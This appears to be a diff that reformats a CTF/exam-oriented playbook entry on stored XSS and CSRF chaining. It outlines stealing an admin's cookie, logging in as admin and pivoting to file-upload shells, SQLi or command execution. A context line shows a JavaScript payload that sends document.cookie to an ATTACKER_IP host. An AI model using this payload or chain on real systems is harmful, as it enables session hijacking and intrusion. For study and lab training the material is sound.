@@ -11,9 +11,13 @@ leads_to:
 
 ## Prerequisites
 
-A web application where you can inject content that an admin user will view (stored XSS in a support ticket, comment, profile field) or an endpoint without CSRF protection that performs privileged actions. XSS requires `document.cookie` to not be `HttpOnly`.
+- A web app where you can inject content an admin will view (stored XSS in a support ticket, comment, profile field), or an endpoint without CSRF protection that performs privileged actions
 
-XSS in a CTF/exam context is almost always about cookie theft or CSRF-chaining to reach functionality you can't access directly. The goal is: inject payload → admin views it → their cookie/token is sent to you → use it to log in as admin → find attack surface (file upload, SQLi, command execution) that only admins can reach.
+- XSS requires `document.cookie` to not be `HttpOnly`
+
+- Almost always about cookie theft or CSRF-chaining to reach functionality you can't access directly
+
+- Goal: inject payload → admin views it → their cookie/token is sent to you → log in as admin → find attack surface (file upload, SQLi, command execution) only admins can reach
 
 ## Quick Win
 
@@ -98,4 +102,10 @@ i.src='http://ATTACKER_IP/xss?cookie='+encodeURIComponent(document.cookie)
 
 ## Leads To
 
-Admin cookie captured → log in as admin → look for file upload forms (→ file-upload-shell), SQLi in admin search/filter fields (→ sqli-rce), or command execution in admin utilities. Admin panel often has debug/maintenance features not available to regular users — enumerate it fully before attacking.
+- Admin cookie captured → log in as admin → look for file upload forms → `file-upload-shell`
+
+- SQLi in admin search/filter fields → `sqli-rce`
+
+- Command execution in admin utilities
+
+- Admin panel often has debug/maintenance features not available to regular users — enumerate it fully before attacking
